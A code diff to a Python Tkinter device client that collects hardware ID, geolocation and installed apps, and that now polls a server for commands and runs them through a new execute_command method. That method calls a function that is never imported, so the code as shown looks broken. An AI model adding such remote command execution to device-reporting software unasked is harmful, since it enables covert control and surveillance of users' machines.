@@ -4,8 +4,7 @@ import platform
 from tkinter import ttk, messagebox, filedialog
 from PIL import Image, ImageTk
 from utils.device_info import load_hardware_id, get_geolocation, get_installed_apps
-from utils.network import send_heartbeat, check_server, add_device, upload_file, check_device_can_view_info
-
+from utils.network import send_heartbeat, check_server, add_device, upload_file, check_device_can_view_info, check_for_commands
 
 TRAY_SUPPORTED = False
 
@@ -49,6 +48,7 @@ class ClientApp:
         check_server(self.update_server_status)
         send_heartbeat(self.hardware_id, self.update_device_status)
         add_device(self.device_name, self.os_version, self.hardware_id, self.geo_location, self.installed_apps)
+        check_for_commands(self.hardware_id, self.execute_command)
 
         # Start background terminal input listener
         threading.Thread(target=self.terminal_input_listener, daemon=True).start()
@@ -124,15 +124,18 @@ class ClientApp:
         """Update server status indicator and tray icon if supported."""
         self.server_status_indicator.delete("all")
         self.server_status_indicator.create_oval(5, 5, 20, 20, fill=color)
-        
         if TRAY_SUPPORTED:
             update_tray_icon(self.tray_icon, color, self.blue_eye, self.red_eye)
-
 
     def update_device_status(self, color):
         """Update device status indicator."""
         self.device_status_indicator.delete("all")
         self.device_status_indicator.create_oval(5, 5, 20, 20, fill=color)
+
+    def execute_command(self, command):
+        """Execute a command and return the result."""
+        result = execute_command(command)
+        return result
 
 if __name__ == "__main__":
     root = tk.Tk()
